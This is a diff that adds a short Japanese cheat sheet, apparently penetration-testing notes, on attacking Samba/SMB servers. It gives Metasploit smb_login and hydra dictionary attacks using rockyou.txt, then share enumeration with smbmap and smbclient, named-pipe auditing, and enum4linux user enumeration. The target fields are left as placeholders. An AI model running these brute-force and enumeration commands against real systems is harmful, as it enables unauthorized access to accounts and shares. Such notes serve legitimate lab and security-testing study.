@@ -1,0 +1,26 @@
+Samba Recon：辞書攻撃
+1) service postgresql start && msfconsoleを起動する
+2) Metasploitでパスコードを探す
+use auxiliary/scanner/smb/smb_login
+set PASS_FILE /usr/share/wordlists/metasploit/unix_passwords.txt
+set SMBUser ユーザー名
+set RHOSTS
+exploit
+3) hydraで辞書攻撃を行う
+gzip -d /usr/share/wordlists/rockyou.txt.gz
+hydra -l admin -P /usr/share/wordlists/rockyou.txt ターゲットドメイン smb
+4) 以下のコマンドを使って、どの共有が読み書き可能か探索する
+smbmap -H ターゲットドメイン -u ユーザー名 -p パスワード名
+5) 以下のコマンドで、Sambaサーバー上の共有を一覧表示する
+smbclient -L ターゲットドメイン -U ユーザー名
+6) 以下のコマンドで、特定のユーザーが共有に存在するかを確認する
+smbclient //ターゲットドメイン/ユーザー名 -U ユーザー名
+7) Sambaサーバー上のSMB経由で使用可能な名前付きパイプを一覧表示する
+msfconsole -q
+use auxiliary/scanner/smb/pipe_auditor
+set SMBUser
+use SMBPass
+set RHOSTS 
+exploit
+8) enum4linuxを使って、Unixユーザーのsidを一覧表示する
+enum4linux -r -u "" -p ""  ターゲットドメイン
